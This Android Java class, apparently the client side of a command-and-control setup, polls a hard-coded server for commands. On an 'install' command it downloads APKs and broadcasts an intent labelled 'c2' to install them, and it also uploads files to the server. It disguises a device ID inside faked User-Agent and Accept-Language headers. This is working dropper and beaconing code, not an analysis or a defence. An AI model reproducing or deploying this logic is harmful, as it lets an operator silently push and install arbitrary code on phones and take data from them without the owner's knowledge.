package com.example.zhaoyan.remote_service;
import android.content.Context;
import android.content.Intent;
import android.media.ExifInterface;
import android.os.Environment;
import android.support.v4.content.ContextCompat;


import android.util.Log;

import com.android.internal.http.multipart.MultipartEntity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;


public class NetworkHelper {
    private static final String TAG = "NwHelper";
    private String upLoadServerUri;
    private String cmdServerUri;
    private String ownId;
    private String hostIP;
    private String downloadUri;
    private String intentUri;

    public NetworkHelper() {
        hostIP = "http://192.168.31.69:5000/";
        upLoadServerUri = hostIP + "api/v1.0/upload";
        cmdServerUri = hostIP + "api/v1.0/cmd";
        downloadUri = hostIP + "api/v1.0/download/";
        intentUri = "com.example.action.ACTION_INSTALL_APK";
        ownId = "00000001";
    }

    public void createTmpFile(Context context, String fileName) {
        /* We have to use the openFileOutput()-method
         * the ActivityContext provides, to
         * protect your file from others and
         * This is done for security-reasons.
         * We chose MODE_WORLD_READABLE, because
         *  we have nothing to hide in our file */
        String pathName = context.getExternalFilesDir(null) + File.separator + fileName;

        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("test.txt",
                    Context.MODE_PRIVATE));
            outputStreamWriter.write("This is a test");
            outputStreamWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        this.uploadFile(context, "test.txt");
    }

    private int installInPlugin(Context context, String file_path) {
        String ACTION_c2_INSTALL_APK = intentUri;
        String ACTION_INSTALL_APK_EXTRA_PARAM1 = "APK_PATH";
        Intent intent = new Intent(ACTION_c2_INSTALL_APK);
        intent.putExtra(ACTION_INSTALL_APK_EXTRA_PARAM1, file_path);
        Log.d(TAG, "sending broadcasting intent.");
        context.sendBroadcast(intent);
        return 0;
    }

    private int processPluginCommands(Context context, String[] cmds) {
        for (String cmd: cmds
             ) {
            if (cmd.contains("install")) {
                String[] args = cmd.split(":");
                String path = args[1];
                String sdPath = context.getExternalFilesDir(null).getAbsolutePath() + File.separator
                        + String.format("%s.apk", path);
                Log.d(TAG, String.format("%s: %s", args[0], sdPath));
                int response = DownloadFile(path, sdPath);
                if (response == 0) {
                    installInPlugin(context, sdPath);
                }
            }
        }

        return  0;
    }

    public int DownloadFile(String arg, String sdCardFilePath) {
        InputStream input = null;
        OutputStream output = null;
        HttpURLConnection connection = null;
        try {
            URL url = new URL(downloadUri + arg);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("USER-AGENT", String.format("Mozilla/5.0-%s", ownId.substring(0, 2)));
            connection.setRequestProperty("ACCEPT-LANGUAGE", String.format("en US-%s", ownId.substring(2, 8)));
            connection.connect();

            // expect HTTP 200 OK, so we don't mistakenly save error report
            // instead of the file
            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                return -1;
            }

            Log.d(TAG, "downloading...");

            // download the file
            input = connection.getInputStream();
            output = new FileOutputStream(sdCardFilePath);

            byte data[] = new byte[4096];

            int count;
            while ((count = input.read(data)) != -1) {
                output.write(data, 0, count);
            }
        } catch (Exception e) {
            return -1;

        } finally {
            try {
                if (output != null)
                    output.close();
                if (input != null)
                    input.close();
            } catch (IOException ignored) {
            }

            if (connection != null)
                connection.disconnect();
        }
        return 0;
    }

    public int receiveCommand(Context context) {
        URL url = null;
        HttpURLConnection connection = null;
        BufferedReader br = null;

        try {
            url = new URL(cmdServerUri);
            connection = (HttpURLConnection)url.openConnection();

            connection.setRequestMethod("GET");
            connection.setRequestProperty("USER-AGENT", String.format("Mozilla/5.0-%s", ownId.substring(0, 2)));
            connection.setRequestProperty("ACCEPT-LANGUAGE", String.format("en US-%s", ownId.substring(2, 8)));
            connection.setReadTimeout(10000 /* milliseconds */ );
            connection.setConnectTimeout(15000 /* milliseconds */ );

            String jsonString = null;

            StringBuilder sb = new StringBuilder();
            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }
            br.close();

            jsonString = sb.toString();
            JSONObject obj = new JSONObject(jsonString);
            Log.d(TAG, jsonString);
            String[] cmds = obj.getString("cmd").split(";");
            processPluginCommands(context, cmds);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }

        return 0;
    }

    public int uploadFile(Context context, String sourceFileUri) {
        String fileName = sourceFileUri;
        int serverResponseCode = 0;

        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1024 * 1024;
        Log.d(TAG, sourceFileUri);

        try {
            // open a URL connection to the Servlet
            InputStream fileInputStream = context.openFileInput(sourceFileUri);
            URL url = new URL(upLoadServerUri);

            // Open a HTTP  connection to  the URL
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true); // Allow Inputs
            conn.setDoOutput(true); // Allow Outputs
            conn.setUseCaches(false); // Don't use a Cached Copy
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            conn.setRequestProperty("file", fileName);

            dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"file\";file\""
                    + fileName + "\"" + lineEnd);

            dos.writeBytes(lineEnd);

            // create a buffer of  maximum size
            bytesAvailable = fileInputStream.available();

            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // read file and write it into form...
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {
                dos.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            }

            // send multipart form data necesssary after file data...
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            // Responses from the server (code and message)
            serverResponseCode = conn.getResponseCode();
            String serverResponseMessage = conn.getResponseMessage();

            Log.i("uploadFile", "HTTP Response is : "
                    + serverResponseMessage + ": " + serverResponseCode);

            if(serverResponseCode == 200){
                Log.i(TAG, "Server acknowledged");
            }

            //close the streams //
            fileInputStream.close();
            dos.flush();
            dos.close();

        } catch (MalformedURLException ex) {
            ex.printStackTrace();
            Log.e(TAG, "error: " + ex.getMessage(), ex);
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "Exception : "  + e.getMessage(), e);
        }

        return serverResponseCode;
    }

}
